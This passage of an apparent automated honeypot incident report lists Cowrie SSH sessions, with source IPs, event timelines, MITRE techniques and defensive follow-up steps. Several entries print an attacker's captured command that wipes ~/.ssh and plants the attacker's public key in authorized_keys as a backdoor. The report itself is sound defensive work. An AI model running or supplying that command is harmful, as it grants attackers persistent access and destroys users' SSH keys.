| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:04:18` | `cowrie.session.connect` |
| `2026-07-05 07:04:18` | `cowrie.client.version` |
| `2026-07-05 07:04:18` | `cowrie.client.kex` |
| `2026-07-05 07:04:19` | `cowrie.login.success` |
| `2026-07-05 07:04:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.118.127[.]138` to AbuseIPDB if not already reported
- [ ] Block `175.118.127[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12513c4e1126

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 07:06 |
| **Last Seen** | 2026-07-05 07:06 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:06:01` | `cowrie.session.connect` |
| `2026-07-05 07:06:03` | `cowrie.client.version` |
| `2026-07-05 07:06:03` | `cowrie.client.kex` |
| `2026-07-05 07:06:08` | `cowrie.login.success` |
| `2026-07-05 07:06:12` | `cowrie.session.params` |
| `2026-07-05 07:06:12` | `cowrie.command.input` |
| `2026-07-05 07:06:13` | `cowrie.log.closed` |
| `2026-07-05 07:06:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e406481fa45

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-05 07:08 |
| **Last Seen** | 2026-07-05 07:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:08:53` | `cowrie.session.connect` |
| `2026-07-05 07:08:53` | `cowrie.client.version` |
| `2026-07-05 07:08:53` | `cowrie.client.kex` |
| `2026-07-05 07:08:53` | `cowrie.login.success` |
| `2026-07-05 07:08:53` | `cowrie.direct-tcpip.request` |
| `2026-07-05 07:08:54` | `cowrie.direct-tcpip.data` |
| `2026-07-05 07:08:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d73736b7a66

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-05 07:09 |
| **Last Seen** | 2026-07-05 07:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:09:55` | `cowrie.session.connect` |
| `2026-07-05 07:09:55` | `cowrie.client.version` |
| `2026-07-05 07:09:56` | `cowrie.client.kex` |
| `2026-07-05 07:09:56` | `cowrie.login.success` |
| `2026-07-05 07:09:57` | `cowrie.session.params` |
| `2026-07-05 07:09:57` | `cowrie.command.input` |
| `2026-07-05 07:09:57` | `cowrie.log.closed` |
| `2026-07-05 07:09:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95657fe9afd5

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:15 |
| **Last Seen** | 2026-07-05 07:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:15:06` | `cowrie.session.connect` |
| `2026-07-05 07:15:06` | `cowrie.client.version` |
| `2026-07-05 07:15:07` | `cowrie.client.kex` |
| `2026-07-05 07:15:08` | `cowrie.login.success` |
| `2026-07-05 07:15:09` | `cowrie.session.params` |
| `2026-07-05 07:15:09` | `cowrie.command.input` |
| `2026-07-05 07:15:09` | `cowrie.command.failed` |
| `2026-07-05 07:15:09` | `cowrie.log.closed` |
| `2026-07-05 07:15:10` | `cowrie.session.params` |
| `2026-07-05 07:15:10` | `cowrie.command.input` |
| `2026-07-05 07:15:11` | `cowrie.session.file_download` |
| `2026-07-05 07:15:11` | `cowrie.log.closed` |
| `2026-07-05 07:15:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca17d8639a1b

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:15 |
| **Last Seen** | 2026-07-05 07:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:15:11` | `cowrie.session.connect` |
| `2026-07-05 07:15:11` | `cowrie.client.version` |
| `2026-07-05 07:15:11` | `cowrie.client.kex` |
| `2026-07-05 07:15:12` | `cowrie.login.success` |
| `2026-07-05 07:15:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65303702033e

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:15 |
| **Last Seen** | 2026-07-05 07:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:15:13` | `cowrie.session.connect` |
| `2026-07-05 07:15:13` | `cowrie.client.version` |
| `2026-07-05 07:15:13` | `cowrie.client.kex` |
| `2026-07-05 07:15:14` | `cowrie.login.success` |
| `2026-07-05 07:15:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1323d28f996c

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:15 |
| **Last Seen** | 2026-07-05 07:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:15:39` | `cowrie.session.connect` |
| `2026-07-05 07:15:39` | `cowrie.client.version` |
| `2026-07-05 07:15:39` | `cowrie.client.kex` |
| `2026-07-05 07:15:40` | `cowrie.login.success` |
| `2026-07-05 07:15:41` | `cowrie.session.params` |
| `2026-07-05 07:15:41` | `cowrie.command.input` |
| `2026-07-05 07:15:41` | `cowrie.command.failed` |
| `2026-07-05 07:15:42` | `cowrie.log.closed` |
| `2026-07-05 07:15:43` | `cowrie.session.params` |
| `2026-07-05 07:15:43` | `cowrie.command.input` |
| `2026-07-05 07:15:43` | `cowrie.session.file_download` |
| `2026-07-05 07:15:43` | `cowrie.log.closed` |
| `2026-07-05 07:15:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3cd15f6055c

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:15 |
| **Last Seen** | 2026-07-05 07:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:15:43` | `cowrie.session.connect` |
| `2026-07-05 07:15:43` | `cowrie.client.version` |
| `2026-07-05 07:15:43` | `cowrie.client.kex` |
| `2026-07-05 07:15:45` | `cowrie.login.success` |
| `2026-07-05 07:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c9f6dd57269

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:15 |
| **Last Seen** | 2026-07-05 07:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:15:45` | `cowrie.session.connect` |
| `2026-07-05 07:15:45` | `cowrie.client.version` |
| `2026-07-05 07:15:45` | `cowrie.client.kex` |
| `2026-07-05 07:15:47` | `cowrie.login.success` |
| `2026-07-05 07:15:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ef2ba0d2932

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:16 |
| **Last Seen** | 2026-07-05 07:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:16:03` | `cowrie.session.connect` |
| `2026-07-05 07:16:03` | `cowrie.client.version` |
| `2026-07-05 07:16:03` | `cowrie.client.kex` |
| `2026-07-05 07:16:04` | `cowrie.login.success` |
| `2026-07-05 07:16:06` | `cowrie.session.params` |
| `2026-07-05 07:16:06` | `cowrie.command.input` |
| `2026-07-05 07:16:06` | `cowrie.command.failed` |
| `2026-07-05 07:16:06` | `cowrie.log.closed` |
| `2026-07-05 07:16:07` | `cowrie.session.params` |
| `2026-07-05 07:16:07` | `cowrie.command.input` |
| `2026-07-05 07:16:07` | `cowrie.session.file_download` |
| `2026-07-05 07:16:07` | `cowrie.log.closed` |
| `2026-07-05 07:16:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b379ed1d375

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:16 |
| **Last Seen** | 2026-07-05 07:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:16:08` | `cowrie.session.connect` |
| `2026-07-05 07:16:08` | `cowrie.client.version` |
| `2026-07-05 07:16:08` | `cowrie.client.kex` |
| `2026-07-05 07:16:09` | `cowrie.login.success` |
| `2026-07-05 07:16:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efdd8d895359

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:16 |
| **Last Seen** | 2026-07-05 07:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:16:10` | `cowrie.session.connect` |
| `2026-07-05 07:16:10` | `cowrie.client.version` |
| `2026-07-05 07:16:10` | `cowrie.client.kex` |
| `2026-07-05 07:16:11` | `cowrie.login.success` |
| `2026-07-05 07:16:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-963797f042e6

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:16 |
| **Last Seen** | 2026-07-05 07:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:16:29` | `cowrie.session.connect` |
| `2026-07-05 07:16:29` | `cowrie.client.version` |
| `2026-07-05 07:16:29` | `cowrie.client.kex` |
| `2026-07-05 07:16:31` | `cowrie.login.success` |
| `2026-07-05 07:16:32` | `cowrie.session.params` |
| `2026-07-05 07:16:32` | `cowrie.command.input` |
| `2026-07-05 07:16:32` | `cowrie.command.failed` |
| `2026-07-05 07:16:32` | `cowrie.log.closed` |
| `2026-07-05 07:16:33` | `cowrie.session.params` |
| `2026-07-05 07:16:33` | `cowrie.command.input` |
| `2026-07-05 07:16:34` | `cowrie.session.file_download` |
| `2026-07-05 07:16:34` | `cowrie.log.closed` |
| `2026-07-05 07:16:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fdd7b6dc280

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:16 |
| **Last Seen** | 2026-07-05 07:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:16:34` | `cowrie.session.connect` |
| `2026-07-05 07:16:34` | `cowrie.client.version` |
| `2026-07-05 07:16:34` | `cowrie.client.kex` |
| `2026-07-05 07:16:35` | `cowrie.login.success` |
| `2026-07-05 07:16:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-697b242b8dd4

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:16 |
| **Last Seen** | 2026-07-05 07:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:16:36` | `cowrie.session.connect` |
| `2026-07-05 07:16:36` | `cowrie.client.version` |
| `2026-07-05 07:16:36` | `cowrie.client.kex` |
| `2026-07-05 07:16:37` | `cowrie.login.success` |
| `2026-07-05 07:16:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b83b25446db

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:16 |
| **Last Seen** | 2026-07-05 07:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:16:59` | `cowrie.session.connect` |
| `2026-07-05 07:16:59` | `cowrie.client.version` |
| `2026-07-05 07:17:00` | `cowrie.client.kex` |
| `2026-07-05 07:17:01` | `cowrie.login.success` |
| `2026-07-05 07:17:02` | `cowrie.session.params` |
| `2026-07-05 07:17:02` | `cowrie.command.input` |
| `2026-07-05 07:17:02` | `cowrie.command.failed` |
| `2026-07-05 07:17:02` | `cowrie.log.closed` |
| `2026-07-05 07:17:03` | `cowrie.session.params` |
| `2026-07-05 07:17:03` | `cowrie.command.input` |
| `2026-07-05 07:17:04` | `cowrie.session.file_download` |
| `2026-07-05 07:17:04` | `cowrie.log.closed` |
| `2026-07-05 07:17:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-836183730e8f

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:17 |
| **Last Seen** | 2026-07-05 07:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:17:04` | `cowrie.session.connect` |
| `2026-07-05 07:17:04` | `cowrie.client.version` |
| `2026-07-05 07:17:04` | `cowrie.client.kex` |
| `2026-07-05 07:17:05` | `cowrie.login.success` |
| `2026-07-05 07:17:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29a7df620f3d

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:17 |
| **Last Seen** | 2026-07-05 07:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:17:06` | `cowrie.session.connect` |
| `2026-07-05 07:17:06` | `cowrie.client.version` |
| `2026-07-05 07:17:06` | `cowrie.client.kex` |
| `2026-07-05 07:17:07` | `cowrie.login.success` |
| `2026-07-05 07:17:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
- [ ] Block `111.19.212[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f09eb055f3a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 07:17 |
| **Last Seen** | 2026-07-05 07:17 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:17:23` | `cowrie.session.connect` |
| `2026-07-05 07:17:25` | `cowrie.client.version` |
| `2026-07-05 07:17:25` | `cowrie.client.kex` |
| `2026-07-05 07:17:31` | `cowrie.login.success` |
| `2026-07-05 07:17:35` | `cowrie.session.params` |
| `2026-07-05 07:17:35` | `cowrie.command.input` |
| `2026-07-05 07:17:37` | `cowrie.log.closed` |
| `2026-07-05 07:17:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1df6ad01971

| Field | Detail |
|---|---|
| **Source IP** | `111.19.212[.]140` |
| **First Seen** | 2026-07-05 07:17 |
| **Last Seen** | 2026-07-05 07:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:17:25` | `cowrie.session.connect` |
| `2026-07-05 07:17:25` | `cowrie.client.version` |
| `2026-07-05 07:17:26` | `cowrie.client.kex` |
| `2026-07-05 07:17:27` | `cowrie.login.success` |
| `2026-07-05 07:17:28` | `cowrie.session.params` |
| `2026-07-05 07:17:28` | `cowrie.command.input` |
| `2026-07-05 07:17:28` | `cowrie.command.failed` |
| `2026-07-05 07:17:28` | `cowrie.log.closed` |
| `2026-07-05 07:17:29` | `cowrie.session.params` |
| `2026-07-05 07:17:29` | `cowrie.command.input` |
| `2026-07-05 07:17:30` | `cowrie.session.file_download` |
| `2026-07-05 07:17:30` | `cowrie.log.closed` |
| `2026-07-05 07:17:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.19.212[.]140` to AbuseIPDB if not already reported
